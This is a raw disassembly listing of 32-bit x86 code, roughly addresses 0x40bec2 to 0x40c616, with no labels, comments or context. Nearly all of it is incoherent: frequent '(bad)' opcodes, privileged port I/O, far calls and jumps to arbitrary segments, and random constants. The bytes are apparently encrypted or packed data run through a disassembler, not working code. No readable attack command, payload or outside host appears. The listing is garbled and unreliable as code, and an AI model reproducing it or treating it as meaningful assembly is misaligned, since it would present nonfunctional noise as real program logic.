  40bec2:	pop    ebp
  40bec3:	jne    0x40bf20
  40bec5:	dec    edi
  40bec6:	in     eax,dx
  40bec7:	retf   0x78a2
  40beca:	push   edi
  40becb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40becc:	mov    al,ds:0x82e7993f
  40bed1:	mov    ds:0xdf36afba,al
  40bed6:	adc    bh,dl
  40bed8:	push   ecx
  40bed9:	loopne 0x40be93
  40bedb:	rcl    BYTE PTR [esp+esi*2+0x54],cl
  40bedf:	(bad)  
  40bee0:	cmp    ebp,ebp
  40bee2:	pop    ebp
  40bee3:	gs jp  0x40bf2e
  40bee6:	mov    cl,BYTE PTR [ebp-0x17]
  40bee9:	pop    ss
  40beea:	add    BYTE PTR [edx],dh
  40beec:	or     edx,ebp
  40beee:	das    
  40beef:	pop    ebp
  40bef0:	push   esp
  40bef1:	shr    BYTE PTR [edi-0x2],cl
  40bef4:	and    al,BYTE PTR [esi]
  40bef6:	sub    DWORD PTR [edx+0x61],edx
  40bef9:	dec    ebx
  40befa:	push   0xffffffa9
  40befc:	push   ss
  40befd:	ins    BYTE PTR es:[edi],dx
  40befe:	dec    ebp
  40beff:	mov    cl,0xb4
  40bf01:	jecxz  0x40bf25
  40bf03:	pop    es
  40bf04:	adc    edi,DWORD PTR [ebx-0x12b018b2]
  40bf0a:	mov    bh,0xf
  40bf0c:	adc    bh,BYTE PTR [esi+0x47976fd5]
  40bf12:	popa   
  40bf13:	push   ds
  40bf14:	xchg   DWORD PTR [ebp+esi*2-0x5f6c9de6],eax
  40bf1b:	jae    0x40bead
  40bf1d:	xor    eax,0xd7414bd
  40bf22:	sahf   
  40bf23:	jp     0x40bf44
  40bf25:	sub    bh,BYTE PTR [ecx-0x16]
  40bf28:	addr16 cwde 
  40bf2a:	loope  0x40bf60
  40bf2c:	mov    edi,0xc4cbb8ef
  40bf31:	or     eax,0xcacd66d0
  40bf36:	add    esi,edi
  40bf38:	push   ds
  40bf39:	(bad)  
  40bf3b:	outs   dx,BYTE PTR ds:[esi]
  40bf3c:	xor    ecx,DWORD PTR [esp+eax*8]
  40bf3f:	cwde   
  40bf40:	sub    dl,BYTE PTR [eax+0x2d25ac24]
  40bf46:	rcr    DWORD PTR [ebp+0x94d1be4],cl
  40bf4c:	sub    BYTE PTR [ebx-0x571677ea],bh
  40bf52:	pop    esi
  40bf53:	jnp    0x40bfaf
  40bf55:	fs popf 
  40bf57:	fstp   DWORD PTR [ecx-0x3effed7d]
  40bf5d:	xchg   edx,eax
  40bf5e:	sub    al,0xa8
  40bf60:	xchg   ebx,eax
  40bf61:	mov    ds:0x72d524b9,al
  40bf66:	inc    esp
  40bf67:	jg     0x40bf7c
  40bf69:	add    esp,esi
  40bf6b:	retf   
  40bf6c:	call   0xdeb6:0x5e58a300
  40bf73:	fcomp  st(3)
  40bf75:	fwait
  40bf76:	dec    eax
  40bf77:	sbb    DWORD PTR [ecx],edi
  40bf79:	into   
  40bf7a:	jl     0x40bf64
  40bf7c:	mov    esi,0xf2062f9a
  40bf81:	dec    edx
  40bf82:	add    ebp,DWORD PTR [ebx-0x2c6d6a6b]
  40bf88:	inc    ebx
  40bf89:	pop    es
  40bf8a:	mov    esi,0x8d6a5486
  40bf8f:	cmp    al,0x80
  40bf91:	push   eax
  40bf92:	or     cl,dl
  40bf94:	in     al,0x49
  40bf96:	mov    esi,0xa369539b
  40bf9b:	mov    dh,0x3f
  40bf9d:	and    al,BYTE PTR [edx+edi*8]
  40bfa0:	sbb    bl,BYTE PTR [ebp-0x3d]
  40bfa3:	add    al,0x9
  40bfa5:	in     eax,0xeb
  40bfa7:	addr16 jns 0x40bfda
  40bfaa:	cs dec ecx
  40bfac:	ins    DWORD PTR es:[edi],dx
  40bfad:	mov    ch,cl
  40bfaf:	dec    ebp
  40bfb0:	cmp    bh,BYTE PTR [edi]
  40bfb2:	xchg   ebx,eax
  40bfb3:	ss call 0xf0a9:0xb287909a
  40bfbb:	dec    esi
  40bfbc:	das    
  40bfbd:	cmc    
  40bfbe:	cmp    DWORD PTR [ecx],edx
  40bfc0:	ins    BYTE PTR es:[edi],dx
  40bfc1:	cld    
  40bfc2:	out    dx,eax
  40bfc3:	push   esi
  40bfc4:	and    dl,ah
  40bfc6:	shr    DWORD PTR [edi],0xfc
  40bfc9:	stc    
  40bfca:	fdiv   QWORD PTR [edx]
  40bfcc:	fisttp DWORD PTR [esi]
  40bfce:	push   ebx
  40bfcf:	(bad)  
  40bfd0:	mov    ecx,0xce72062c
  40bfd5:	int3   
  40bfd6:	jnp    0x40bfde
  40bfd8:	mov    edx,0x1e7da254
  40bfdd:	xchg   esi,eax
  40bfde:	jae    0x40c035
  40bfe0:	jle    0x40c012
  40bfe2:	xor    DWORD PTR [ebx-0x56],eax
  40bfe5:	enter  0xc624,0xbd
  40bfe9:	sbb    eax,0x62bfd9
  40bfee:	(bad)  [edi-0x61dd878d]
  40bff4:	inc    esi
  40bff5:	cld    
  40bff6:	push   ebp
  40bff7:	mov    dh,0x72
  40bff9:	call   0xaa15c42c
  40bffe:	mov    eax,0xde0cece8
  40c003:	loopne 0x40c059
  40c005:	rcr    DWORD PTR [ecx+0x33f1c98c],0x91
  40c00c:	or     DWORD PTR [eax-0x52710dd6],0xb53b470a
  40c016:	ror    esp,1
  40c018:	iret   
  40c019:	icebp  
  40c01a:	(bad)  
  40c01b:	retf   0xb90
  40c01e:	in     eax,0x2f
  40c020:	sar    BYTE PTR [ebx-0x4d338e44],cl
  40c026:	loope  0x40bfb7
  40c028:	lods   eax,DWORD PTR ds:[esi]
  40c029:	(bad)  
  40c02a:	inc    edi
  40c02b:	mov    dh,0x75
  40c02d:	sar    DWORD PTR [edi-0x5d],cl
  40c030:	mov    dh,0xa4
  40c032:	mov    ch,0xaf
  40c034:	sbb    ebp,ebp
  40c036:	or     edi,ebx
  40c038:	adc    DWORD PTR ds:0xa18c7291,eax
  40c03e:	fs inc ebx
  40c040:	cld    
  40c041:	jp     0x40bfdb
  40c043:	lock adc esi,DWORD PTR [esi]
  40c046:	fcmove st,st(2)
  40c048:	in     al,dx
  40c049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c04a:	fwait
  40c04b:	mov    WORD PTR [ebp+0x244890e3],gs
  40c051:	push   0x62c0daa7
  40c056:	rcl    BYTE PTR [edi+0x47da27c9],0x50
  40c05d:	xor    ch,dh
  40c05f:	pop    es
  40c060:	stos   BYTE PTR es:[edi],al
  40c061:	mov    al,0x7d
  40c063:	test   eax,0x83ba9b16
  40c068:	aaa    
  40c069:	push   DWORD PTR [ebx+0x1c]
  40c06c:	stos   DWORD PTR es:[edi],eax
  40c06d:	in     eax,0xf4
  40c06f:	and    BYTE PTR [edi],al
  40c071:	pop    esi
  40c072:	sub    BYTE PTR [ebx],dl
  40c074:	push   ss
  40c075:	aas    
  40c076:	jge    0x40c054
  40c078:	xchg   ebx,eax
  40c079:	iret   
  40c07a:	adc    BYTE PTR [ebp-0x2244c002],al
  40c080:	pop    edi
  40c081:	rol    BYTE PTR [ebx],1
  40c083:	sti    
  40c084:	and    DWORD PTR [ecx-0x7ea907eb],0x52f4ab83
  40c08e:	lods   eax,DWORD PTR ds:[esi]
  40c08f:	outs   dx,DWORD PTR ds:[esi]
  40c090:	bound  ebp,QWORD PTR [edi-0x3e]
  40c093:	stos   DWORD PTR es:[edi],eax
  40c094:	mov    dl,0xd4
  40c097:	push   esp
  40c098:	pusha  
  40c099:	sar    DWORD PTR [edx-0x5],cl
  40c09c:	mov    esp,0xdf66a223
  40c0a1:	add    cl,ah
  40c0a3:	mov    bh,0xea
  40c0a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0a6:	sub    eax,0x541e83f5
  40c0ab:	dec    esi
  40c0ac:	retf   
  40c0ad:	loopne 0x40c12a
  40c0af:	(bad)  gs:[ecx+0x8]
  40c0b3:	int    0xf8
  40c0b5:	fs cli 
  40c0b7:	into   
  40c0b8:	fist   WORD PTR [edx-0x6aa3f80c]
  40c0be:	push   0x8
  40c0c0:	js     0x40c12f
  40c0c2:	jp     0x40c12f
  40c0c4:	cmp    al,0x3c
  40c0c6:	lahf   
  40c0c7:	test   al,0x21
  40c0c9:	sti    
  40c0ca:	mov    fs,WORD PTR [ecx-0x63bfc6f8]
  40c0d0:	arpl   WORD PTR [eax+0x3d696662],ax
  40c0d6:	gs and ecx,0x7b
  40c0da:	jo     0x40c104
  40c0dc:	push   eax
  40c0dd:	cs scas eax,DWORD PTR es:[edi]
  40c0df:	sbb    eax,0xf81a74b7
  40c0e4:	loopne 0x40c0bf
  40c0e6:	jl     0x40c08e
  40c0e8:	test   BYTE PTR [eax-0x3da4a22f],ch
  40c0ee:	push   ebx
  40c0ef:	je     0x40c164
  40c0f1:	mov    ch,0x0
  40c0f3:	int    0xb7
  40c0f5:	out    0x1d,al
  40c0f7:	add    eax,0x971c5bdc
  40c0fc:	out    dx,al
  40c0fd:	mov    ebp,0x9145d2c4
  40c102:	sub    bh,ch
  40c104:	test   al,0x23
  40c106:	push   ds
  40c107:	cmc    
  40c108:	xchg   edi,eax
  40c109:	(bad)  [edi]
  40c10b:	sub    edx,eax
  40c10d:	(bad)  
  40c10e:	xor    ah,BYTE PTR ds:0xbb7a03c2
  40c114:	cmp    BYTE PTR [ebx],ah
  40c116:	(bad)  
  40c118:	push   ss
  40c119:	cmp    ebx,DWORD PTR [ebp-0x1596b2cc]
  40c11f:	inc    esi
  40c120:	clc    
  40c121:	jb     0x40c1a2
  40c123:	push   0xe
  40c125:	not    ebx
  40c127:	or     ebx,ebx
  40c129:	jl     0x40c0f9
  40c12b:	xchg   BYTE PTR [ebx],ch
  40c12d:	mov    ds:0x8591b6a4,eax
  40c132:	xlat   BYTE PTR ds:[ebx]
  40c133:	and    eax,0xbe40edb0
  40c138:	push   ebx
  40c139:	stos   BYTE PTR es:[edi],al
  40c13a:	das    
  40c13b:	add    BYTE PTR [ebx-0x73f2835d],cl
  40c141:	test   al,0x67
  40c143:	dec    eax
  40c144:	aam    0xc5
  40c146:	loopne 0x40c0dd
  40c148:	inc    esp
  40c149:	mov    ds:0x4fc5b39f,eax
  40c14e:	shr    BYTE PTR [ecx+0x14],cl
  40c151:	inc    eax
  40c152:	jmp    0xece4:0xd7bfff53
  40c159:	lds    ebx,FWORD PTR [eax+0x5f]
  40c15c:	test   DWORD PTR [edi+0x6b1b2ca4],0x8f72f69a
  40c166:	loope  0x40c14a
  40c168:	add    DWORD PTR [esi+0x22584e39],eax
  40c16e:	pop    ss
  40c16f:	fiadd  WORD PTR [edx-0x14433fca]
  40c175:	je     0x40c15d
  40c177:	adc    DWORD PTR [eax-0x152b49de],edi
  40c17d:	adc    edi,ebx
  40c17f:	(bad)  
  40c180:	dec    ebp
  40c181:	stc    
  40c182:	xor    edi,DWORD PTR [edi-0x57]
  40c185:	and    eax,DWORD PTR [ebp-0x6d]
  40c188:	sub    DWORD PTR [edi],esp
  40c18a:	imul   eax,DWORD PTR fs:[edi+0x46],0x3c
  40c18f:	das    
  40c190:	add    dh,BYTE PTR [ebx]
  40c192:	(bad)  
  40c193:	dec    esi
  40c194:	call   0xa88c39dc
  40c199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c19a:	(bad)  
  40c19b:	inc    edi
  40c19c:	xchg   edi,eax
  40c19d:	or     DWORD PTR gs:[esp+ebx*1+0xb],esp
  40c1a2:	loop   0x40c16a
  40c1a4:	push   ebx
  40c1a5:	ss (bad) 
  40c1a7:	sbb    DWORD PTR [edi-0x674fdd03],edx
  40c1ad:	js     0x40c1f4
  40c1af:	iret   
  40c1b0:	mov    ah,0x93
  40c1b2:	pop    ds
  40c1b3:	aas    
  40c1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1b5:	loope  0x40c236
  40c1b7:	lods   al,BYTE PTR ds:[esi]
  40c1b8:	inc    ebp
  40c1b9:	sub    DWORD PTR es:[edx+0x1],eax
  40c1bd:	aas    
  40c1be:	stos   BYTE PTR es:[edi],al
  40c1bf:	xchg   esp,eax
  40c1c0:	imul   esi,DWORD PTR [eax+0x47],0x2c3946cf
  40c1c7:	jge    0x40c243
  40c1c9:	dec    esi
  40c1ca:	ins    BYTE PTR es:[edi],dx
  40c1cb:	jae    0x40c234
  40c1cd:	out    0xcd,eax
  40c1cf:	jge    0x40c18f
  40c1d1:	sahf   
  40c1d2:	nop
  40c1d3:	div    edx
  40c1d5:	jne    0x40c254
  40c1d7:	adc    al,0xba
  40c1d9:	pusha  
  40c1da:	adc    BYTE PTR [edx+0x75],dl
  40c1dd:	jmp    0x2448:0xacff3cae
  40c1e4:	scas   al,BYTE PTR es:[edi]
  40c1e5:	mov    al,ds:0x31bf7275
  40c1ea:	xchg   ecx,eax
  40c1eb:	dec    edx
  40c1ec:	std    
  40c1ed:	pusha  
  40c1ee:	jl     0x40c1a8
  40c1f0:	jmp    0x1e185c49
  40c1f5:	call   0xa29c:0x1c86f8ce
  40c1fc:	(bad)
  40c1ff:	mov    edx,0x717891cd
  40c204:	pusha  
  40c205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c206:	pusha  
  40c207:	xor    esp,DWORD PTR [ebx]
  40c209:	call   0x86ec:0xac1face9
  40c210:	xor    BYTE PTR [ebp+0xae40189],0x16
  40c217:	or     DWORD PTR ds:0x842fa253,edi
  40c21d:	and    DWORD PTR [ebx-0x3f],edi
  40c220:	cmc    
  40c221:	ds mov ecx,0x42e2ce23
  40c227:	imul   esp,DWORD PTR [eax+0x6f604481],0x9e241b8f
  40c231:	inc    eax
  40c232:	repnz clc 
  40c234:	iret   
  40c235:	dec    ebp
  40c236:	push   esp
  40c237:	pusha  
  40c238:	sbb    eax,0x20d231e8
  40c23d:	jbe    0x40c1ea
  40c23f:	test   al,0x8
  40c241:	push   edx
  40c242:	sbb    al,0x83
  40c244:	jb     0x40c244
  40c246:	(bad)  
  40c247:	iret   
  40c248:	(bad)  
  40c249:	iret   
  40c24a:	push   ecx
  40c24b:	pop    es
  40c24c:	mov    al,0x1f
  40c24e:	mov    ebp,0xaabdf47b
  40c253:	mov    bl,0x10
  40c255:	lds    edx,FWORD PTR [eax]
  40c257:	fsubr  QWORD PTR [esi]
  40c259:	xor    DWORD PTR [edx+0x30],ebp
  40c25c:	retf   0x1e51
  40c25f:	push   edi
  40c260:	daa    
  40c261:	xor    DWORD PTR ds:0x9db52246,ebx
  40c267:	mov    DWORD PTR [eax-0x6d9a36c8],ebp
  40c26d:	push   0x5c
  40c26f:	jmp    0x9279:0x2b4ac13
  40c276:	ins    BYTE PTR es:[edi],dx
  40c277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c278:	aam    0x21
  40c27a:	mov    bh,BYTE PTR ds:0x9d070087
  40c280:	mov    dh,0xa8
  40c282:	pop    edx
  40c283:	mov    edx,ebp
  40c285:	fld    QWORD PTR [eax-0xa57e049]
  40c28b:	adc    al,0x25
  40c28d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c28e:	mov    bh,0xfd
  40c290:	add    al,0x4
  40c292:	cs dec esi
  40c294:	inc    eax
  40c295:	stc    
  40c296:	lahf   
  40c297:	in     eax,0x81
  40c299:	or     dh,BYTE PTR [ebx+0x5b]
  40c29c:	stos   BYTE PTR es:[edi],al
  40c29d:	aad    0xeb
  40c29f:	or     BYTE PTR [edi+0x5890679e],ch
  40c2a5:	jnp    0x40c2f1
  40c2a7:	ror    DWORD PTR [edx+0x6188456e],0x2d
  40c2ae:	mov    al,ds:0x1add5771
  40c2b3:	xor    ah,BYTE PTR [edi]
  40c2b5:	pop    ds
  40c2b6:	test   DWORD PTR [esi*4-0x6a1ac1cd],edi
  40c2bd:	inc    edx
  40c2be:	mov    edi,0xe5d24409
  40c2c3:	xchg   esi,eax
  40c2c4:	push   eax
  40c2c5:	sub    edx,DWORD PTR [ebx]
  40c2c7:	je     0x40c2a5
  40c2c9:	call   0x4e47ce1c
  40c2ce:	je     0x40c337
  40c2d0:	fsub   st,st(1)
  40c2d2:	cmp    al,0x57
  40c2d4:	(bad)  
  40c2d5:	mov    esp,0x2e7e9e0a
  40c2da:	dec    ecx
  40c2db:	test   al,0xb0
  40c2dd:	pushf  
  40c2de:	fcom   DWORD PTR [edi+edx*1-0x5b57cefa]
  40c2e5:	in     al,dx
  40c2e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2e7:	fild   DWORD PTR [esi+0x6c]
  40c2ea:	iret   
  40c2eb:	jne    0x40c31d
  40c2ed:	retf   0x480a
  40c2f0:	idiv   BYTE PTR [ebp-0x60]
  40c2f3:	loop   0x40c320
  40c2f5:	pusha  
  40c2f6:	retf   
  40c2f7:	inc    esp
  40c2f8:	push   eax
  40c2f9:	mov    edx,0xe3d0e5a9
  40c2fe:	or     BYTE PTR [eax+0x27],ch
  40c301:	in     eax,dx
  40c302:	mov    BYTE PTR [esi+0x1a],cl
  40c305:	mov    ch,ch
  40c307:	xchg   DWORD PTR [ecx-0x34d4b246],edi
  40c30d:	in     eax,0x1
  40c30f:	mov    bh,0x9e
  40c311:	je     0x40c2d9
  40c313:	inc    esi
  40c314:	add    al,0x4b
  40c316:	imul   eax,ecx,0x35
  40c319:	mov    bh,BYTE PTR [ebx]
  40c31b:	leave  
  40c31c:	leave  
  40c31d:	push   0x7a
  40c31f:	xchg   edi,eax
  40c320:	sbb    BYTE PTR [edi],ah
  40c322:	fld    DWORD PTR [eax+0x3d8fe9e]
  40c328:	push   edi
  40c329:	icebp  
  40c32a:	mov    ebx,0xb9dd3fee
  40c32f:	add    ebp,ebx
  40c331:	ret    0x11a0
  40c334:	jp     0x40c2d2
  40c336:	(bad)  
  40c338:	(bad)  
  40c339:	sbb    dh,BYTE PTR [ebx-0x12]
  40c33c:	outs   dx,DWORD PTR ds:[esi]
  40c33d:	fisub  DWORD PTR [edi]
  40c33f:	and    DWORD PTR [esi-0x4419e993],ebx
  40c345:	xor    DWORD PTR [ebx],esp
  40c347:	or     eax,0x51c2f449
  40c34c:	or     eax,0x1aafafe7
  40c351:	js     0x40c383
  40c353:	cdq    
  40c354:	inc    eax
  40c355:	in     eax,0x25
  40c357:	adc    dh,ch
  40c359:	sub    DWORD PTR [esi-0x64],ecx
  40c35c:	dec    edx
  40c35d:	push   ebx
  40c35e:	lock and DWORD PTR [esi-0x47],edx
  40c362:	inc    eax
  40c363:	jl     0x40c3cb
  40c365:	clc    
  40c366:	inc    di
  40c368:	ja     0x40c357
  40c36a:	xor    BYTE PTR [eax+0x70de3391],bl
  40c370:	xor    ah,ah
  40c372:	or     BYTE PTR [ebp+0x5c],dh
  40c375:	ror    BYTE PTR [esi+0x45],1
  40c378:	out    dx,al
  40c379:	push   0xfffffffe
  40c37b:	imul   sp,bp,0xffad
  40c37f:	jmp    0xd2aa2a2c
  40c384:	mov    ebx,DWORD PTR [esi+0x478f6157]
  40c38a:	cmp    al,0xec
  40c38c:	fiadd  DWORD PTR [edx]
  40c38e:	and    ch,ah
  40c390:	pop    ecx
  40c391:	scas   eax,DWORD PTR es:[edi]
  40c392:	mov    eax,ds:0x738d5606
  40c397:	sbb    bl,BYTE PTR [esi-0x32caa131]
  40c39d:	imul   edi,DWORD PTR [edi],0x22
  40c3a0:	mov    ebp,DWORD PTR [edx]
  40c3a2:	outs   dx,BYTE PTR ds:[esi]
  40c3a3:	ins    BYTE PTR es:[edi],dx
  40c3a4:	push   es
  40c3a5:	in     eax,dx
  40c3a6:	mov    BYTE PTR [ecx+0x28],ah
  40c3a9:	mov    edi,0xf02ee1e7
  40c3ae:	rcl    DWORD PTR [esi+0x6b],cl
  40c3b1:	aas    
  40c3b2:	aad    0xfe
  40c3b4:	push   ss
  40c3b5:	jp     0x40c34f
  40c3b7:	cmp    ch,BYTE PTR [eax+edi*2+0x7e674e72]
  40c3be:	iret   
  40c3bf:	das    
  40c3c0:	pop    edx
  40c3c1:	jae    0x40c35c
  40c3c3:	mov    ebp,edx
  40c3c5:	stc    
  40c3c6:	sbb    cl,BYTE PTR [eax]
  40c3c8:	mov    edx,0x7455f852
  40c3cd:	or     dh,al
  40c3cf:	into   
  40c3d0:	sub    eax,ebx
  40c3d2:	mov    eax,ds:0x14501a24
  40c3d7:	mov    ebx,0xd9772dbf
  40c3dc:	xchg   DWORD PTR [ebp-0x9],edx
  40c3df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3e0:	daa    
  40c3e1:	sti    
  40c3e2:	int    0x16
  40c3e4:	push   ebp
  40c3e5:	xchg   esi,eax
  40c3e6:	cs mov ebp,ebx
  40c3e9:	je     0x40c3ec
  40c3eb:	ds call 0x4fdf3e86
  40c3f1:	lods   al,BYTE PTR ds:[esi]
  40c3f2:	ss sbb eax,0xf626ad9c
  40c3f8:	gs loop 0x40c460
  40c3fb:	jmp    0x40c385
  40c3fd:	push   0xd14fd2eb
  40c402:	dec    DWORD PTR [esi]
  40c404:	push   ss
  40c405:	dec    eax
  40c406:	mov    ds:0x5021be00,eax
  40c40b:	pop    ecx
  40c40c:	xchg   DWORD PTR [eax-0x3d0eccd1],edx
  40c412:	adc    esp,ebp
  40c414:	dec    edx
  40c415:	mov    dh,0x92
  40c417:	hlt    
  40c418:	inc    esi
  40c419:	lahf   
  40c41a:	jecxz  0x40c445
  40c41c:	dec    edi
  40c41d:	push   esi
  40c41e:	repnz retf 
  40c420:	xchg   DWORD PTR [eax+0x4e],ebp
  40c423:	into   
  40c424:	xchg   ecx,eax
  40c425:	repnz sub esi,DWORD PTR [eax-0x767c530a]
  40c42c:	(bad)  
  40c42d:	imul   edx,DWORD PTR [edi+0x51b1d374],0xffffff8f
  40c434:	mov    eax,0x3e836aea
  40c439:	add    al,BYTE PTR [ecx]
  40c43b:	stos   BYTE PTR es:[edi],al
  40c43c:	out    0x8b,al
  40c43e:	repz cdq 
  40c440:	pusha  
  40c441:	and    dh,ch
  40c443:	repz push ss
  40c445:	lahf   
  40c446:	inc    ebx
  40c447:	test   eax,0x783c1457
  40c44c:	ds adc al,0x99
  40c44f:	ret    0xf025
  40c452:	jbe    0x40c410
  40c454:	aaa    
  40c455:	ret    0x4f7f
  40c458:	inc    ecx
  40c459:	mov    ebp,0xc2738be8
  40c45e:	aas    
  40c45f:	push   edi
  40c460:	das    
  40c461:	inc    edi
  40c462:	dec    edx
  40c463:	cli    
  40c464:	(bad)  
  40c465:	out    dx,al
  40c466:	add    eax,0xd409040a
  40c46b:	les    ecx,FWORD PTR [ecx-0x60]
  40c46e:	dec    esi
  40c46f:	push   esp
  40c470:	inc    ebp
  40c471:	and    cl,BYTE PTR [ebp-0xcfb52f1]
  40c477:	mov    eax,ds:0x577d810a
  40c47c:	sub    ebp,DWORD PTR [eax+0x17]
  40c47f:	dec    ecx
  40c480:	xchg   esp,eax
  40c481:	scas   eax,DWORD PTR es:[edi]
  40c482:	and    DWORD PTR [edi],eax
  40c484:	cmp    eax,0x52984608
  40c489:	xor    ah,0x1c
  40c48c:	mov    eax,ds:0x3e457464
  40c491:	nop
  40c492:	data16 mov cl,0xa7
  40c495:	cwde   
  40c496:	shl    cl,1
  40c498:	pushf  
  40c499:	mov    eax,0x63088023
  40c49e:	xchg   esp,eax
  40c49f:	adc    al,0xa0
  40c4a1:	mov    cl,0xd5
  40c4a3:	loope  0x40c426
  40c4a5:	dec    ebp
  40c4a6:	add    ebp,DWORD PTR [ecx+eiz*4]
  40c4a9:	mov    BYTE PTR [eax+eax*1-0x4866dfd1],dl
  40c4b0:	fimul  DWORD PTR [edx]
  40c4b2:	ins    DWORD PTR es:[edi],dx
  40c4b3:	lea    eax,[edi+0x620d031f]
  40c4b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4ba:	adc    DWORD PTR [edi+0x472b8f1e],esp
  40c4c0:	or     BYTE PTR [ebx-0x7e],cl
  40c4c3:	mov    ah,0xb0
  40c4c5:	push   ss
  40c4c6:	or     DWORD PTR [ebp-0x6a],ecx
  40c4c9:	cmp    dl,BYTE PTR [ebx-0x172bfa7a]
  40c4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d0:	mov    edx,ebx
  40c4d2:	pop    esp
  40c4d3:	mov    bl,0x2a
  40c4d5:	fwait
  40c4d6:	out    0x3c,al
  40c4d8:	pop    esi
  40c4d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4da:	or     DWORD PTR [ecx+ebx*4-0x14],0xffffffc2
  40c4df:	ret    
  40c4e0:	xor    al,BYTE PTR [edx+eiz*1+0x2c40c871]
  40c4e7:	ficom  WORD PTR [edx-0x508198e6]
  40c4ed:	jmp    0x446c:0x73d63976
  40c4f4:	in     eax,dx
  40c4f5:	add    bh,bl
  40c4f7:	jno    0x40c4b0
  40c4f9:	inc    esi
  40c4fa:	das    
  40c4fb:	repz mov ch,0x53
  40c4fe:	xchg   edx,eax
  40c4ff:	ja     0x40c48f
  40c501:	bound  ecx,QWORD PTR [esi+esi*1-0x69]
  40c505:	das    
  40c506:	fldcw  WORD PTR [esi-0x1e38317c]
  40c50c:	mov    bh,0x39
  40c50e:	push   ebx
  40c50f:	inc    esi
  40c510:	(bad)  
  40c511:	mov    ds:0x8207afa9,al
  40c516:	xchg   ecx,eax
  40c517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c518:	out    dx,eax
  40c519:	in     eax,dx
  40c51a:	sbb    esp,edx
  40c51c:	jno    0x40c593
  40c51e:	jno    0x40c4ec
  40c520:	pop    ss
  40c521:	test   DWORD PTR ds:0x7e914791,ebx
  40c527:	add    DWORD PTR [ecx],0x40a3c07f
  40c52d:	sahf   
  40c52e:	mov    edi,0x8d523243
  40c533:	mov    al,0xcc
  40c535:	pop    DWORD PTR [ebp+eax*2-0x601ea476]
  40c53c:	and    DWORD PTR [ebx-0x8f65108],ebx
  40c542:	or     al,0xe1
  40c544:	jmp    0xf7f5:0xa7f83c8d
  40c54b:	lds    ebx,FWORD PTR [ecx+0x11]
  40c54e:	jge    0x40c531
  40c550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c551:	jg     0x40c506
  40c553:	jne    0x40c4f4
  40c555:	xchg   esi,eax
  40c556:	stos   BYTE PTR es:[edi],al
  40c557:	xor    al,0xc9
  40c559:	sub    DWORD PTR [ebx+0x6c],esi
  40c55c:	sbb    eax,0xd2042250
  40c561:	loope  0x40c55b
  40c563:	jae    0x40c52e
  40c565:	sub    eax,0x6628aef4
  40c56a:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c56c:	cmp    BYTE PTR [eax-0x5a0415ff],0xf6
  40c573:	aam    0xc5
  40c575:	and    BYTE PTR [ebx],0x5c
  40c578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c579:	jecxz  0x40c5db
  40c57b:	je     0x40c521
  40c57d:	xchg   edi,eax
  40c57e:	and    al,0x1f
  40c580:	call   0x8be1:0xbff0cb81
  40c587:	mov    bh,0x20
  40c589:	sbb    dh,BYTE PTR [ecx+edi*1]
  40c58c:	repnz adc bh,BYTE PTR [ebp+0x16acc910]
  40c593:	scas   eax,DWORD PTR es:[edi]
  40c594:	sub    al,0x4d
  40c596:	pop    ecx
  40c597:	loopne 0x40c584
  40c599:	dec    edi
  40c59a:	push   ebx
  40c59b:	xchg   cl,ah
  40c59d:	js     0x40c558
  40c59f:	data16 out 0x8f,al
  40c5a2:	adc    ah,ch
  40c5a4:	call   0x47bb:0xd08d759b
  40c5ab:	inc    edi
  40c5ac:	outs   dx,DWORD PTR ds:[esi]
  40c5ad:	pop    eax
  40c5ae:	pop    edi
  40c5af:	mov    ebp,DWORD PTR [ecx]
  40c5b1:	sbb    edx,DWORD PTR [eax-0x64]
  40c5b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5b5:	cdq    
  40c5b6:	jg     0x40c54b
  40c5b8:	xchg   esp,eax
  40c5b9:	jns    0x40c626
  40c5bb:	xor    ecx,DWORD PTR [edi]
  40c5bd:	sub    bl,dh
  40c5bf:	pop    ebx
  40c5c0:	scas   al,BYTE PTR es:[edi]
  40c5c1:	add    BYTE PTR [esp+edi*4-0x1a],cl
  40c5c5:	imul   esp,DWORD PTR ds:0x6b3f1ae6,0x81a3c21e
  40c5cf:	jmp    0x40c5ab
  40c5d1:	scas   eax,DWORD PTR es:[edi]
  40c5d2:	ds aas 
  40c5d4:	stos   DWORD PTR es:[edi],eax
  40c5d5:	and    dl,BYTE PTR [ebp+0x29]
  40c5d8:	adc    al,0x3c
  40c5da:	cmp    BYTE PTR [edx+ebx*1],cl
  40c5dd:	jl     0x40c5e3
  40c5df:	fld    st(5)
  40c5e1:	jns    0x40c5ea
  40c5e3:	iret   
  40c5e4:	mov    edi,0xa62df92
  40c5e9:	dec    edi
  40c5ea:	cli    
  40c5eb:	cli    
  40c5ec:	jo     0x40c65b
  40c5ee:	imul   esp,DWORD PTR [edi+eax*4+0x18],0x43b842de
  40c5f6:	pushf  
  40c5f7:	shr    BYTE PTR [edi-0x33],1
  40c5fa:	stos   DWORD PTR es:[edi],eax
  40c5fb:	out    dx,eax
  40c5fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5fd:	dec    ebp
  40c5fe:	mov    ebx,0x5c860e1b
  40c603:	jne    0x40c62f
  40c605:	or     BYTE PTR [ebx+0x3e3944a7],bl
  40c60b:	leave  
  40c60c:	jle    0x40c64c
  40c60e:	not    BYTE PTR ss:[esi-0x396cafa4]
  40c615:	push   ds
  40c616:	pop    DWORD PTR [ebx]
